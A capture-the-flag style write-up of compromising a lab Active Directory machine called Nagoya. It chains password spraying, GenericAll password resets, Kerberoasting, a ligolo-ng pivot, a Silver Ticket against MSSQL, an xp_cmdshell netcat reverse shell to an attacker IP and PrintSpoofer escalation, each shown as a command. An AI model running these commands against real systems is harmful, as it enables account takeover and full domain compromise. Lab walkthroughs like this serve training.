#box

*Created: 2/17/2026*

### Username

**Tags:** #cewl #sed #Credential-Guessing #bruteforce #kerbrute

**Command:**
```bash
./username-anarchy matthew harrison > users.txt
```

*Port: 80 | 💎 GEM*

> 
> The machine hosts on port 80 a website, on the `/team` endpoint we discover a list of users and we promptly add it to a file. After using cEWL we try to bruteforce with the given users and the words exfiltrated with cEWL but unfortunately we aren't able to obtain anything out of it. After some time we notice the `2023` year on the bottom of the application. We try to add a suffix of 2023 to all the words extrapolated with cEWL and start again the bruteforce, discovering the user:  `Andrea.Hayes:Nagoya2023`
> 
> The page shown a 2023 label on the bottom:
> 
> ![Image](attachments/Nagoya-1.png)
> 
> After performing some enumeration and guessing we find the password for the user `Andrea.Hayes`:
> 
> ![Image](attachments/Nagoya-2.png)

---

### Step 2

**Tags:** #GenericAll #bloodhound

**Command:**
```bash
net rpc password "Bethan.Webster" "Nagoya2023" -U "nagoya-industries.com"/"Andrea.Hayes"%"Nagoya2023" -S "nagoya-industries.com"
```

*💎 GEM*

> 
> Once obtainted access with the user `Andrea.Hayes` we realize through bloodhound that we have the permissions to reach a developer user which has also access to RDP named `Christopher.Lewis`. To compromise him we'll first need to compromise the user `Bethan.Webster` through a `GenericAll` claim and then hop onto `Bethan.Webster` and leverage the GenericAll claim she has over the user `Christopher.Lewis`. With that, we finally have an user that can access the machine with WinRM
> 
> In the screenshot below we have a representation of the path we're going to execute on this step that moves us from `Andrea.Hayes` to the user `Christopher.Lewis`
> 
> ![Image](attachments/Nagoya-3.png)

---

### Step 3

**Tags:** #Kerberoast #hashcat #TGS-Hash

**Command:**
```bash
targetedKerberoast -v -d 'nagoya-industries.com' -u 'Andrea.Hayes' -p 'Nagoya2023' -o kerberoasted_hash
```

*Port: 88*

> 
> We notice through bloodhound that a few users can be Kerberoasted, so we opt to kerberoast them and try to crack their tgs. In the end we'll obtain `svc_mssql:Service`.

---

### Step 4

**Tags:** #evil-winrm #WinRM #ligolo-ng #Pivoting

**Command:**
```bash
evil-winrm -i 192.168.45.157 -u 'Christopher.Lewis' -p 'Nagoya2023'
```

*Port: 5985 | 💎 GEM*

> 
> Now, we're unable to access directly the MSSQL Service since it's not reachable from the outside, however, we have our Remote Desktop User that can help us into making a pivot onto the target machine. For this action we'll use `ligolo-ng`
> 
> The set up process looks like the following:
> 
> Kali machine:
> 
> ![Image](attachments/Nagoya-4.png)
> 
> Target Machine:
> 
> ![Image](attachments/Nagoya-5.png)
> 
> Reachable Service:
> 
> ![Image](attachments/Nagoya-6.png)

---

### Step 5

**Tags:** #impacket-mssqlclient #mssql

**Command:**
```bash
impacket-mssqlclient 'nagoya-industries.com/svc_mssql':'Service1'@240.0.0.1 -windows-auth
```

*Port: 1433*

> 
> Once connected to the service, we can confirm that we're able to reach the MSSQL service, thus we shall be able to connect to the SQL instance noticed inside the WinRM session with `netstat -ano | findstr 1433`.

---

### Step 6

**Tags:** #kerberos #Active-Directory #Silver-Ticket-Attack #ccache

**Command:**
```bash
Get-ADDomain
```

*Port: 1433 | 💎 GEM*

> 
> Unfortunately, being authenticated simply as svc_mssql doesn't lead us anywhere. However, we own a service account, this will permit us to use the Silver Ticket attack to craft a Silver Ticket to authenticate as administrator of a service. To do that we'll fundamentally need 4 things:  
> 
> * The Domain SID, obtainable with `Get-ADDomain`
> * The NTHASH of the password of the service user, this is used to encrypt the PAC used to craft the TGS. This [tool](https://www.browserling.com/tools/ntlm-hash) can be used
> * The SPN of the service user: `Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames`
> * The domain name: `nagoya-industries.com`

---

### Step 7

**Tags:** #xp_cmdshell #Reverse-Shell

**Command:**
```sql
enable xp_cmdshell
EXEC xp_cmdshell 'C:\Temp\nc.exe 192.168.45.157 3389 -e cmd';
```

*Port: 1433 | 💎 GEM*

> 
> Once authenticated, we're finally able to use `xp_cmdshell`. We immediately catch a shell on port 3389 to get a session as `svc_mssql` after enabling `xp_cmdshell`

---

### Step 8

**Tags:** #PrintSpoofer #SeImpersonatePrivilege

**Command:**
```bash
.\PrintSpoofer64.exe -i -c cmd
```

> 
> Once had a session as `svc_mssql`, we find out that we have `SeImpersonatePrivilege`. We use `PrintSpoofer64.exe` to get a SYSTEM shell, owning the AD.

---

